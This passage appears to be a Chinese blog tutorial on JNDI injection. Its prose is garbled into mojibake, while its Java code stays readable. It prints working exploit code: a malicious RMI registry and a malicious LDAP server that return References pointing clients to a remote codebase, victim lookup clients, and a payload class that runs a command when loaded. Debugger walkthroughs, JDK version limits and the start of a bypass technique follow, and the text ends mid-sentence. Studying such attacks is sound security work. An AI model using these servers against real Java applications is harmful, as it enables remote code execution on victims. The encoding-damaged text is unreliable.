è·Ÿè¿›è¿™é‡Œçš„getURLOrDefaultInitCtx()æ–¹æ³•ï¼š\nè¿˜æ˜¯åŒæ ·çš„ï¼Œä¼šç›´æ¥è°ƒç”¨æœ€åçš„getDefaultInitCtx()æ–¹æ³•ï¼Œå‰é¢çš„ä»£ç è·Ÿä¸€ä¸‹æºç å³å¯ï¼ŒæŒºå¥½çœ‹æ‡‚çš„ï¼š\nåŒæ ·çš„ç›´æ¥è¿”å›DnsContextç±»å®ä¾‹ã€‚å¹¶ä¸”åœ¨InitialDirContextç±»çš„getURLOrDefaultInitDirCtx()æ–¹æ³•ä¹Ÿæ˜¯ç›´æ¥è¿”å›è¿™ä¸ªDnsContextç±»å®ä¾‹ï¼š\næ‰€ä»¥è¿™é‡Œçš„ç¬¬ä¸€ä¸ªç‚¹å°±æ˜¯è·å–DnsContextç±»å®ä¾‹ã€‚\nâ€”â€”â€”â€”\nè·Ÿè¿›getAttributes(name, attrIds)ä»£ç ï¼š æ‰€ä»¥ç°åœ¨æ˜¯ä¼šè°ƒç”¨DnsContextç±»çš„çˆ¶ç±»çš„çˆ¶ç±»PartialCompositeDirContextçš„getAttibutes()æ–¹æ³•ï¼Œè·Ÿè¿›ï¼š\nè¿˜æ˜¯å…ˆç®€å•çœ‹ä¸€ä¸‹CompositeNameç±»çš„åˆå§‹åŒ–ï¼š\nåŒæ ·çš„è¿˜æ˜¯å°†CompositeNameç±»çš„implå˜é‡èµ‹å€¼ä¸ºè¿™ä¸ªã€‚\nä½†å…¶å®å¯ä»¥ç›´æ¥çœ‹ä½œbadidu.comï¼Œç»§ç»­è·Ÿä»£ç ï¼Œæ‰€ä»¥ç°åœ¨ä¼šè°ƒç”¨å¦ä¸€ä¸ªé‡è½½çš„getAttributes()æ–¹æ³•ï¼š\næŒ‰é¡ºåºç®€å•è¯´è¯´ï¼š\nå…ˆæ˜¯å°†è¿™é‡Œçš„var3å˜é‡èµ‹å€¼ä¸ºäº†DnsContextç±»å®ä¾‹ã€‚\nç„¶åè°ƒç”¨äº†p_getEnvironment()æ–¹æ³•ï¼Œå®é™…ä¸Šä¼šè°ƒç”¨DnsContextç±»çš„è¿™ä¸ªæ–¹æ³•ï¼š\nç›´æ¥è¿”å›äº†Hashtableç±»å®ä¾‹ã€‚\nç„¶åå®ä¾‹åŒ–äº†ä¸€ä¸ªContinuationç±»ï¼š ä¼ å…¥äº†è¿™ä¸ªå­—ç¬¦ä¸²å’ŒHashtableç±»å®ä¾‹ã€‚\nç„¶ååˆ°äº†forå¾ªç¯ï¼Œä¼šè°ƒç”¨DnsContextçˆ¶ç±»ComponentDirContextçš„p_getAttributes()æ–¹æ³•ï¼š è¿™é‡Œçš„var4å˜é‡æ˜¯ä¸€ä¸ªHeadTailç±»å®ä¾‹ï¼Œåç»­çš„HeadTail.getStatusè¿”å›2ï¼Œä¼šè°ƒç”¨c_getAttributesæ–¹æ³•ï¼ˆgetHead()æ–¹æ³•è¿”å›çš„æ˜¯â€œbaidu.com\u0026quot;ï¼‰ï¼š\næŸ¥è¯¢é€»è¾‘ä¸ºï¼š\næ‰€ä»¥è¿™é‡Œå®é™…ä¼šè°ƒç”¨DnsClientç±»çš„quey()æ–¹æ³•ï¼Œç„¶ååˆä¼šè°ƒç”¨åˆ°doUdpQuery()æ–¹æ³•ï¼š\nå‰é¢çš„send()æ–¹æ³•å°±æ˜¯è¿›è¡Œè¿æ¥ï¼Œå‘é€è¯·æ±‚åˆ°ç›¸åº”çš„DNSæœåŠ¡å™¨ï¼Œåä¸€ä¸ªå°±æ˜¯è·å–æ•°æ®ã€‚\næœ€åquery()æ–¹æ³•ç»“æŸè·å¾—çš„æ•°æ®ï¼š\næœ€åå¾—åˆ°æ•°æ®ï¼š\nâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\nJNDIæ”»å‡» åœ¨å­¦ä¹ JNDIæ”»å‡»å‰ï¼Œå…ˆç®€å•äº†è§£ä¸¤ä¸ªçŸ¥è¯†ç‚¹ã€‚\nå‰ç½®çŸ¥è¯†äº†è§£ Referenceç±»äº†è§£ è¯¥ç±»ä½äºjavax.naming.Referenceï¼Œè¯¥ç±»è¡¨ç¤ºå¯¹åœ¨å‘½å/ç›®å½•ç³»ç»Ÿå¤–éƒ¨æ‰¾åˆ°çš„å¯¹è±¡çš„å¼•ç”¨ã€‚æä¾›äº†JNDIä¸­ç±»çš„å¼•ç”¨åŠŸèƒ½ã€‚\nä¸€ä¸ªç¤ºä¾‹ä»£ç ï¼š\n1 2 String url = \u0026#34;http://127.0.0.1:8080\u0026#34;; Reference reference = new Reference(\u0026#34;test\u0026#34;, \u0026#34;test\u0026#34;, url); åˆ©ç”¨çš„æ„é€ å‡½æ•°ï¼š\nè¿™é‡Œæ¶‰åŠåˆ°çš„ä¸‰ä¸ªå˜é‡:\nå°±æ˜¯å°†è¿™ä¸ªç±»çš„è¿™ä¸‰ä¸ªå‚æ•°èµ‹å€¼ä¸ºå¯¹åº”çš„å‚æ•°ã€‚\nå°±åˆ©ç”¨æ¥è¯´ï¼Œä¸‰ä¸ªå‚æ•°å¯ä»¥å¦‚ä¸‹ç†è§£ï¼š\nclassNameï¼šè¿œç¨‹åŠ è½½æ—¶æ‰€ä½¿ç”¨çš„ç±»åï¼Œæœ¬åœ°æ‰¾ä¸åˆ°ï¼Œå°±å»è¿œç¨‹åŠ è½½ classFactoryï¼šåŠ è½½classä¸­éœ€è¦å®ä¾‹åŒ–ç±»çš„åç§° classFactoryLocationï¼šå·¥å‚åŠ è½½çš„åœ°å€ï¼Œæä¾›classesæ•°æ®çš„åœ°å€ï¼ˆå¯ä»¥æ˜¯file/ftp/httpåè®®ï¼‰ åé¢ç”¨ä¸€ä¸ªå®ä¾‹æ¥è¯´æ˜ä¸€ä¸‹åˆ©ç”¨ã€‚\nè¿œç¨‹å¯¹è±¡å¼•ç”¨å®‰å…¨é™åˆ¶ RMIæœåŠ¡ä¸­å¼•ç”¨è¿œç¨‹å¯¹è±¡å°†å—æœ¬åœ°Javaç¯å¢ƒçš„é™åˆ¶ï¼Œéœ€è¦java.rmi.server.useCodebaseOnlyé…ç½®å¿…é¡»ä¸ºfalseï¼Œè¡¨ç¤ºå…è®¸åŠ è½½é™¤äº†Classpathå¤–çš„è¿œç¨‹å¯¹è±¡ã€‚\nè€Œåœ¨JNDIè·å–RMIæœåŠ¡ä¸­ï¼Œè¢«å¼•ç”¨çš„è¿œç¨‹å·¥å‚å¯¹è±¡ä¹Ÿå°†å—com.sun.jndi.rmi.object.trustURLCodebaseé…ç½®é™åˆ¶ï¼Œä¸ºfalseè¡¨ç¤ºä¸ä¿¡ä»»è¿œç¨‹å¼•ç”¨å¯¹è±¡ï¼Œå°±ä¸èƒ½è°ƒç”¨è¿œç¨‹çš„å¼•ç”¨å¯¹è±¡\nJNDI-RMIæ³¨å…¥ ç¤ºä¾‹ä»£ç  å…ˆç»™æ³¨å…¥æ–¹æ³•æ“ä½œä¸€ä¸‹ï¼š\nRMI Serverç«¯ä»£ç ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package JNDI; import com.sun.jndi.rmi.registry.ReferenceWrapper; import javax.naming.NamingException; import javax.naming.Reference; import java.rmi.AlreadyBoundException; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class JNDI_RMI_Server{ public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException { String url = \u0026#34;http://127.0.0.1:7979/\u0026#34;; Registry registry = LocateRegistry.createRegistry(1099); Reference reference = new Reference(\u0026#34;JNDI_Main\u0026#34;, \u0026#34;JNDI_Main\u0026#34;, url); ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference); registry.bind(\u0026#34;Hello\u0026#34;,referenceWrapper); System.out.println(\u0026#34;running\u0026#34;); } } è¿™é‡Œéœ€è¦å°†å‰é¢çš„Referenceå¯¹è±¡ä¼ è¿›ReferenceWrapperï¼Œè¿™æ˜¯å› ä¸ºReferenceç±»æ²¡æœ‰å®ç°Remoteæ¥å£ä¹Ÿæ²¡æœ‰ç»§æ‰¿UnicastRemoteObjectç±»ï¼Œæ‰€ä»¥è¿™é‡Œç”¨ReferenceWrapperç±»å°†å…¶å°è£…äº†ä¸€ä¸‹ã€‚\nRMIClientç«¯ä»£ç ï¼š 1 2 3 4 5 6 7 8 9 10 11 package JNDI; import javax.naming.InitialContext; public class JNDI_RMI_Client{ public static void main(String[] args) throws Exception { String url = \u0026#34;rmi://localhost:1099/Hello\u0026#34;; InitialContext initialContext = new InitialContext(); initialContext.lookup(url); } } ç„¶åéœ€è¦å‡†å¤‡ä¸€ä¸ªè¿œç¨‹åŠ è½½çš„ç±»ï¼š 1 2 3 4 5 6 7 8 9 import java.lang.Runtime; public class JNDI_Main { public JNDI_Main() throws Exception{ Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } } //æ³¨æ„è¿™é‡Œä¸èƒ½æœ‰åŒ…åï¼Œè‡ªå·±æœ¬åœ°æ‰“è¸©äº†ä¸€ä¸‹å‘ï¼Œä¹Ÿè®¸å…¶ä»–ç¯å¢ƒä¸ä¼šæœ‰è¿™ä¸ªé—®é¢˜ ç„¶åä½¿ç”¨javacå‘½ä»¤å°†è¿™ä¸ªæ–‡ä»¶æ‰“æˆclassæ–‡ä»¶ï¼Œç„¶åå†ç”¨pythonèµ·ä¸€ä¸ªHTTPæœåŠ¡ï¼š\n1 python -m http.server 7979 ç„¶åè¿è¡ŒServerç«¯ï¼Œå†è¿è¡ŒClientå‘èµ·è¯·æ±‚ï¼ŒæˆåŠŸå¼¹å‡ºè®¡ç®—æœºï¼š åŸç†ç®€å•æ¥è¯´å°±æ˜¯æŠŠå¼•ç”¨äº†æ¶æ„ç±»çš„Referenceç±»ç»‘å®šåˆ°RMIçš„Registryä¸­ã€‚\nåœ¨å®¢æˆ·ç«¯è°ƒç”¨lookupè¿œç¨‹è·å–è¿œç¨‹ç±»çš„æ—¶å€™ï¼Œå°±ä¼šè·å–åˆ°Referenceå¯¹è±¡ï¼Œå°±ä¼šå»å¯»æ‰¾Referenceä¸­æŒ‡å®šçš„ç±»ï¼Œå¦‚æœæŸ¥æ‰¾ä¸åˆ°åˆ™ä¼šåœ¨Referenceä¸­æŒ‡å®šçš„è¿œç¨‹åœ°å€å»è¿›è¡Œè¯·æ±‚ï¼Œè¯·æ±‚åˆ°è¿œç¨‹çš„ç±»åä¼šåœ¨æœ¬åœ°æ‰§è¡Œã€‚\nè¿™é‡Œå…¶å®ç®—æ”»å‡»å®¢æˆ·ç«¯ã€‚\nä»£ç è°ƒè¯• JNDI_RMI_Serverç«¯ å¤§è‡´è¿˜æ˜¯å’ŒRMIæœåŠ¡ç«¯çš„åˆ›å»ºæ˜¯å·®ä¸å¤šçš„ï¼Œä¸»è¦æ˜¯ä¸ºäº†çœ‹çœ‹å¼•ç”¨ç±»ä¸­çš„èµ‹å€¼æƒ…å†µã€‚\nå¤§æ¦‚çœ‹äº†ä¸€ä¸‹ï¼ŒReferenceç±»è¿˜æ˜¯å’Œå‰é¢è¯´çš„å·®ä¸å¤šï¼Œä¸»è¦çœ‹çœ‹ReferenceWrapperçš„èµ‹å€¼æƒ…å†µï¼š\nä¹Ÿå°±æ˜¯å°†è¿™é‡Œçš„wrapperå˜é‡èµ‹å€¼ä¸ºReferenceç±»ã€‚\nç¨å¾®å…³æ³¨ä¸€ä¸‹è¿™é‡Œçš„getReference()æ–¹æ³•ã€‚\næœ€ååœ¨æ³¨å†Œè¡¨ä¸­å°†RMIæœåŠ¡å’ŒReferenceWrapperå¯¹è±¡ç»‘å®šåœ¨ä¸€èµ·ã€‚\nJNDI_RMI_Clientç«¯ æ‰“æ–­ç‚¹äºlookup()æ–¹æ³•ï¼Œæ‰€ä»¥ç°åœ¨ä¼šè°ƒç”¨InitialContextç±»çš„lookup()æ–¹æ³•ï¼š\nå‰é¢ä¸€éƒ¨åˆ†å…¶å®æ˜¯å’ŒRMIæœåŠ¡åŠ¨æ€åè®®è½¬æ¢é‚£é‡Œå·®ä¸å¤šçš„ï¼Œä¸»è¦ä»ä¸åŒçš„åœ°æ–¹è¯´èµ·ï¼Œç›´æ¥åˆ°è°ƒç”¨RegistryImpl_Stubç±»çš„lookup()æ–¹æ³•ç»“æŸï¼š æ­¤æ—¶çš„å˜é‡æƒ…å†µï¼š åœ¨å‰é¢çš„RMIæ¥å£å®ç°ä¸­åˆ†æè¿™é‡Œåœ¨è°ƒç”¨lookup()æ–¹æ³•åä¼šå¾—åˆ°ä»£ç†å¯¹è±¡ï¼Œä½†æ˜¯å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œè¿™é‡Œä¼šå¾—åˆ°ä¸€ä¸ªReferenceWrapper_Stubç±»ï¼Œè·Ÿè¿›è¿™é‡Œçš„decodeObject()æ–¹æ³•ï¼š è¿™é‡Œçš„ReferenceWrapper_Stubç±»å®ç°äº†RemoteReferenceæ¥å£ï¼Œæ‰€ä»¥è¿™é‡Œä¼šè°ƒç”¨ReferenceWrapper_Stubç±»çš„getReference()æ–¹æ³•ï¼š\nè¿™é‡Œåˆè°ƒç”¨äº†UnicastRefç±»çš„invoke()æ–¹æ³•è¿›è¡Œæ•°æ®ä¼ è¾“ï¼Œå¾—åˆ°äº†Referenceå¯¹è±¡å¹¶å°†å…¶è¿”å›ï¼Œæ‰€ä»¥ç°åœ¨varçš„å€¼ä¸ºï¼š\nç„¶ååˆè°ƒç”¨äº†NamingManagerç±»çš„getObjectInstance()æ–¹æ³•ï¼š å˜é‡æƒ…å†µï¼š\nè·Ÿè¿›NamingManagerç±»çš„getObjectInstance()æ–¹æ³•ï¼š éƒ¨åˆ†ä»£ç ï¼Œæ¯éƒ¨åˆ†éƒ½åˆ†æä¸€ä¸‹ï¼š\nè¿™é‡Œä¼šè°ƒç”¨getObjectFactoyBuilder()æ–¹æ³•ï¼Œè¿™é‡Œå°±æ˜¯ä¼šè¿”å›å˜é‡çš„å€¼ï¼Œä½†æ˜¯è¿™é‡Œçš„å€¼é»˜è®¤ä¸ºnullï¼Œæ‰€ä»¥ä¸ä¼šè¿›å…¥åé¢çš„ifæ¡ä»¶ã€‚\nçœ‹åé¢çš„ä»£ç ï¼š\nrefInfoå°±æ˜¯å‚æ•°ä¼ é€’çš„Referenceç±»ï¼Œç¬¦åˆç¬¬ä¸€ä¸ªifæ¡ä»¶ï¼Œæ‰€ä»¥ç°åœ¨ä¼šå°†refå˜é‡èµ‹å€¼ä¸ºè¿™ä¸ªReferenceç±»ã€‚\nå†å¾€åé¢çœ‹ï¼Œä¼šè¿›å…¥ç¬¬ä¸€ä¸ªifè¯­å¥ï¼Œä¼šå°†fèµ‹å€¼ä¸ºå‰é¢Referenceç±»åˆå§‹åŒ–æ—¶ä¼ çš„å‚ï¼Œå¦‚ä¸‹ï¼š\nå³è¦åˆå§‹åŒ–çš„ç±»ã€‚\næ‰€ä»¥ç°åœ¨ä¼šè¿›å…¥ç¬¬äºŒä¸ªifæ¡ä»¶ï¼š\næ‰€ä»¥ç°åœ¨ä¼šè°ƒç”¨getObjectFactoryFromReference()æ–¹æ³•ï¼ˆæ³¨æ„ä¼ å…¥äº†Referenceç±»å’Œè¿™ä¸ªclassFactoryï¼‰ï¼š\nå¯ä»¥çœ‹åˆ°æœ‰åŠ è½½ç±»çš„æ“ä½œï¼Œä¹Ÿå°±æ˜¯æ¶æ„ç±»JNDI_Mainã€‚åœ¨ç¬¬äºŒä¸ªloadClass()æ–¹æ³•è·å–åˆ°äº†JNDI_Mainç±»çš„classå¯¹è±¡ï¼Œç¬¬ä¸€ä¸ªåº”è¯¥æ˜¯å…ˆåœ¨æœ¬åœ°æ‰¾ï¼Œæ‰¾ä¸åˆ°å°±å»å·¥å‚è·¯å¾„æ‰¾ï¼š\nå¹¶ä¸”åé¢æœ‰å®ä¾‹åŒ–ç±»çš„æ“ä½œï¼š å¾ˆæ˜æ˜¾ä¼šå®ä¾‹åŒ–ç±»æˆåŠŸè°ƒç”¨æ¶æ„æ–¹æ³•ã€‚\nåœ¨å¼¹è®¡ç®—æœºåå°±è¿›å…¥å¼‚å¸¸è¾“å‡ºï¼Œæ•´ä¸ªè¿‡ç¨‹ç»“æŸï¼š\nJNDI-Ldapæ³¨å…¥ LDAPä¹Ÿæ˜¯ä¸€ç§ç›®å½•æœåŠ¡ï¼Œå‰é¢åˆ†æçš„DNSå…¶å®åªç”¨å®¢æˆ·ç«¯å°±èƒ½å®Œæˆä¸€æ¬¡å®Œæ•´çš„æœåŠ¡ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨LDAPè¿™ä¸ªç›®å½•æœåŠ¡æ¥å®Œæˆä¸€æ¬¡æ”»å‡»ã€‚\næ€è·¯æ˜¯å·®ä¸å¤šçš„ï¼Œå½“æŸ¥è¯¢å±æ€§çš„å€¼æ—¶ï¼Œæˆ‘ä»¬è¿”å›ä¸€ä¸ªå­˜å‚¨æ¶æ„ç±»çš„Referenceç±»ç»™å®¢æˆ·ç«¯ï¼Œè®©å®¢æˆ·ç«¯æ ¹æ®codebaseè·¯å¾„æŸ¥æ‰¾å·¥å‚ã€‚\néœ€è¦ç”¨éœ€è¦å¼•å…¥unboundid-ldapsdk-3.2.0.jaråŒ…ï¼Œç›´æ¥åœ¨pom.xmlå¼•å…¥å³å¯ï¼š\n1 2 3 4 5 6 7 \u0026lt;!-- https://mvnrepository.com/artifact/com.unboundid/unboundid-ldapsdk --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.unboundid\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;unboundid-ldapsdk\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.2.0\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;test\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; åŸºæœ¬ä»£ç  æ¶æ„LDAPæœåŠ¡ç«¯ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 package JNDI; import com.unboundid.ldap.listener.InMemoryDirectoryServer; import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig; import com.unboundid.ldap.listener.InMemoryListenerConfig; import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult; import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor; import com.unboundid.ldap.sdk.Entry; import com.unboundid.ldap.sdk.LDAPException; import com.unboundid.ldap.sdk.LDAPResult; import com.unboundid.ldap.sdk.ResultCode; import javax.net.ServerSocketFactory; import javax.net.SocketFactory; import javax.net.ssl.SSLSocketFactory; import java.net.InetAddress; import java.net.MalformedURLException; import java.net.URL; public class LDAP_EVIL_Server { private static final String LDAP_BASE = \u0026#34;dc=example,dc=com\u0026#34;; public static void main ( String[] tmp_args ) { String[] args=new String[]{\u0026#34;http://127.0.0.1:8888/#Test\u0026#34;}; int port = 2333; try { InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE); config.setListenerConfigs(new InMemoryListenerConfig( \u0026#34;listen\u0026#34;, //$NON-NLS-1$ InetAddress.getByName(\u0026#34;0.0.0.0\u0026#34;), //$NON-NLS-1$ port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault())); config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ]))); InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config); System.out.println(\u0026#34;Listening on 0.0.0.0:\u0026#34; + port); //$NON-NLS-1$ ds.startListening(); } catch ( Exception e ) { e.printStackTrace(); } } private static class OperationInterceptor extends InMemoryOperationInterceptor { private URL codebase; public OperationInterceptor ( URL cb ) { this.codebase = cb; } @Override public void processSearchResult ( InMemoryInterceptedSearchResult result ) { String base = result.getRequest().getBaseDN(); Entry e = new Entry(base); try { sendResult(result, base, e); } catch ( Exception e1 ) { e1.printStackTrace(); } } protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException { URL turl = new URL(this.codebase, this.codebase.getRef().replace(\u0026#39;.\u0026#39;, \u0026#39;/\u0026#39;).concat(\u0026#34;.class\u0026#34;)); System.out.println(\u0026#34;Send LDAP reference result for \u0026#34; + base + \u0026#34; redirecting to \u0026#34; + turl); e.addAttribute(\u0026#34;javaClassName\u0026#34;, \u0026#34;fupanc\u0026#34;); String cbstring = this.codebase.toString(); int refPos = cbstring.indexOf(\u0026#39;#\u0026#39;); if ( refPos \u0026gt; 0 ) { cbstring = cbstring.substring(0, refPos); } e.addAttribute(\u0026#34;javaCodeBase\u0026#34;, cbstring); e.addAttribute(\u0026#34;objectClass\u0026#34;, \u0026#34;javaNamingReference\u0026#34;); //$NON-NLS-1$ e.addAttribute(\u0026#34;javaFactory\u0026#34;, this.codebase.getRef()); result.sendSearchEntry(e); result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); } } } ç„¶åå†ç¼–å†™ä¸€ä¸ªå®¢æˆ·ç«¯æ¥è¯·æ±‚ï¼š\n1 2 3 4 5 6 7 8 9 package JNDI; import javax.naming.directory.InitialDirContext; public class LDAP_Client { public static void main(String[] args) throws Exception { Object object = new InitialDirContext().lookup(\u0026#34;ldap://127.0.0.1:8888/Test\u0026#34;); } } ç„¶åè¿˜æ˜¯ä½¿ç”¨ä¹‹å‰çš„æ¶æ„ç±»ï¼ŒæŒ‰ç…§ä¹‹é—´çš„æ“ä½œç¼–è¯‘classæ–‡ä»¶å¹¶èµ·ä¸€ä¸ªhttpæœåŠ¡ã€‚\nç„¶åå¯åŠ¨æœåŠ¡ç«¯ï¼Œå†å¯åŠ¨å®¢æˆ·ç«¯å°±å¯ä»¥æˆåŠŸå¼¹è®¡ç®—æœºï¼š ä»£ç è°ƒè¯• LDAP_Clientç«¯ å¯¹åº”ä»£ç ï¼š\n1 Object object = new InitialDirContext().lookup(\u0026#34;ldap://127.0.0.1:2333/test\u0026#34;); å‰é¢ä¸€ä¸ªInitialDirContextç±»çš„åˆå§‹åŒ–ä¹Ÿæ˜¯è¯´è¿‡çš„ï¼Œå¤§æ¦‚å°±æ˜¯å®ä¾‹åŒ–äº†InitialDirContextç±»åŠå…¶çˆ¶ç±»InitialContextç±»ï¼Œå¹¶å°†InitialContextç±»çš„myPopsèµ‹å€¼ä¸ºäº†ä¸€ä¸ªç©ºçš„Hashtableç±»ã€‚\nç„¶åé‡ç‚¹çœ‹InitialDirContextç±»è°ƒç”¨çš„lookup()æ–¹æ³•ï¼š\nè€æœ‹å‹äº†ï¼Œä¸å¤šè¯´ï¼Œç¬¬ä¸€éƒ¨åˆ†ï¼š ç„¶åè°ƒç”¨getURLContext()æ–¹æ³•ï¼š ç„¶åè°ƒç”¨getURLObject()æ–¹æ³•ï¼š ç„¶åè·å–åˆ°ldapæœåŠ¡çš„å·¥å‚ç±»å¹¶è°ƒç”¨å·¥å‚ç±»ldapURLContextFactoyçš„getObjectInstance()æ–¹æ³•ï¼š ç„¶åå®ä¾‹åŒ–ldapURLContextç±»ï¼Œé‡Œé¢æœ‰ä¸€ä¸ªå°†å…¶çˆ¶ç±»çš„çˆ¶ç±»GenericURLContextç±»çš„myEnvå˜é‡èµ‹å€¼ä¸ºç©ºçš„Hashtableç±»çš„æ“ä½œã€‚\næ‰€ä»¥ç¬¬ä¸€éƒ¨åˆ†æ˜¯è·å–åˆ°äº†ldapURLContextç±»\nâ€”â€”â€”â€”â€”â€”\næ‰€ä»¥ç¬¬äºŒéƒ¨åˆ†ä¼šè°ƒç”¨ldapURLContextç±»çš„lookup()æ–¹æ³•ï¼š ä¼šè°ƒç”¨åˆ°å…¶çˆ¶ç±»çš„çˆ¶ç±»çš„lookup()æ–¹æ³•ï¼š è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯thisä»£è¡¨ldapURLContextç±»ï¼Œæ‰€ä»¥ä¼šè°ƒç”¨ldapURLContextç±»çš„getRootURLContext()æ–¹æ³•ï¼Œç„¶åå°±ä¼šè°ƒç”¨ldapURLContextFactoryç±»çš„getUsingURLIgnoreRootDN()æ–¹æ³•ï¼š\næœ€åè·å–åˆ°çš„ç»“æœå¦‚ä¸‹ï¼š\nåé¢è·Ÿè¿›è°ƒç”¨çš„lookup()æ–¹æ³•ï¼š ç„¶åä¼šè°ƒç”¨LdapCtxç±»çš„p_lookup()æ–¹æ³•ï¼š è·Ÿè¿›p_lookup()æ–¹æ³•ï¼š var4.getStatus()æ–¹æ³•è¿”å›2ï¼Œä¼šåŒ¹é…2çš„ä»£ç ï¼Œè·Ÿè¿›c_lookup()æ–¹æ³•ï¼Œç›´æ¥çœ‹å…³é”®ä»£ç ï¼š\nè¿™é‡Œçš„var4ä¸­å­˜åœ¨LDAPçš„åŸºæœ¬ä¿¡æ¯ï¼š\nè¿™é‡Œçš„JAVA_ATTRIBUTESå˜é‡å°±æ˜¯ä¸€ä¸ªæ•°ç»„ï¼š\næ‰€ä»¥ifæ¡ä»¶ä¸­è·å–åˆ°äº†å€¼ï¼š\nç„¶åè°ƒç”¨äº†decodeObject()æ–¹æ³•ï¼Œåœ¨decodeObject()æ–¹æ³•ä¸­è°ƒç”¨äº†decodeReference()æ–¹æ³•.\nåœ¨è¿™ä¸ªdecodeReference()æ–¹æ³•æ–¹æ³•ä¸­è¿›è¡Œäº†Referenceç±»çš„åˆå§‹åŒ–ï¼š\nçœ‹ä¼ å…¥çš„å‚æ•°ï¼Œå¹¶ä¸”æœ€åè¿”å›äº†è¿™ä¸ªvar5ã€‚\nå›åˆ°c_lookup()æ–¹æ³•ï¼Œæœ€åè°ƒç”¨äº†getObjectInstance()æ–¹æ³•ï¼ˆè¿™é‡Œçš„var3å°±æ˜¯å‰é¢çš„Referenceç±»ï¼‰ï¼š\nè·Ÿè¿›æ–¹æ³•ï¼š\nè¿™é‡Œçš„ä»£ç æ˜¯å’Œå‰é¢JNDI_RMIçš„æ”»å‡»çš„å…¶ä¸­ä¸€éƒ¨åˆ†ä»£ç éƒ½æ˜¯å·®ä¸å¤šçš„ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰ç‚¹åŒºåˆ«ï¼š ç„¶åä¼šè°ƒç”¨getObjectFactoryFromReference()æ–¹æ³•ï¼š\nç„¶åä¼šåŠ è½½ç±»ï¼Œå¹¶ä¸”æœ€åä¼šå®ä¾‹åŒ–è¿™ä¸ªç±»ï¼ŒæˆåŠŸå¼¹è®¡ç®—æœºï¼š\næœ€åè¿˜æ˜¯åŒæ ·å¼‚å¸¸è¾“å‡ºç„¶ååˆ°catchè¯­å¥ã€‚\næ³¨æ„äº‹é¡¹ JDKç‰ˆæœ¬å¯¹JNDIçš„åˆ©ç”¨æœ‰ä¸€å®šçš„é™åˆ¶ï¼Œå¦‚ä¸‹ï¼š\n1 2 3 JDK 6u141ã€7u131ã€8u121ä¹‹åï¼šå¢åŠ äº†com.sun.jndi.rmi.object.trustURLCodebaseé€‰é¡¹ï¼Œé»˜è®¤ä¸ºfalseï¼Œç¦æ­¢RMIå’ŒCORBAåè®®ä½¿ç”¨è¿œç¨‹codebaseçš„é€‰é¡¹ï¼Œå› æ­¤RMIå’ŒCORBAåœ¨ä»¥ä¸Šçš„JDKç‰ˆæœ¬ä¸Šå·²ç»æ— æ³•è§¦å‘è¯¥æ¼æ´ï¼Œä½†ä¾ç„¶å¯ä»¥é€šè¿‡æŒ‡å®šURIä¸ºLDAPåè®®æ¥è¿›è¡ŒJNDIæ³¨å…¥æ”»å‡»ã€‚ JDK 6u211ã€7u201ã€8u191ä¹‹åï¼šå¢åŠ äº†com.sun.jndi.ldap.object.trustURLCodebaseé€‰é¡¹ï¼Œé»˜è®¤ä¸ºfalseï¼Œç¦æ­¢LDAPåè®®ä½¿ç”¨è¿œç¨‹codebaseçš„é€‰é¡¹ï¼ŒæŠŠLDAPåè®®çš„æ”»å‡»é€”å¾„ä¹Ÿç»™ç¦äº†ã€‚ é«˜ç‰ˆæœ¬é™åˆ¶ç»•è¿‡ æµ‹è¯•ç¯å¢ƒï¼šJDK 8u411\nâ€”â€”â€”â€”â€”â€”\né™åˆ¶åœ°ç‚¹ï¼š\nRMIï¼š è¿™é‡Œå¯¼è‡´æ— æ³•ç»§ç»­åé¢çš„æ“ä½œã€‚\nåˆ©ç”¨æœ¬åœ°Classä½œä¸ºReference Factory åœ¨å‰é¢è¯´äº†ï¼Œè™½ç„¶æˆ‘ä»¬ä¸èƒ½ä»è¿œç¨‹åŠ è½½æ¶æ„çš„Factoyï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åœ¨è¿”å›çš„Referenceä¸­æŒ‡å®šFactory Classï¼Œå³æˆ‘ä»¬å¯ä»¥å°è¯•åˆ©ç”¨æœ¬åœ°çš„ç±»ï¼Œè®©æœ¬åœ°çš„ç±»æ¥åŠ è½½æ¶æ„ä»£ç ã€‚\nå·¥å‚åˆ—å¿…é¡»å®ç°javax.naming.spi.ObjectFactory æ¥å£ï¼Œå¹¶ä¸”è‡³å°‘å­˜åœ¨ä¸€ä¸ª getObjectInstance() 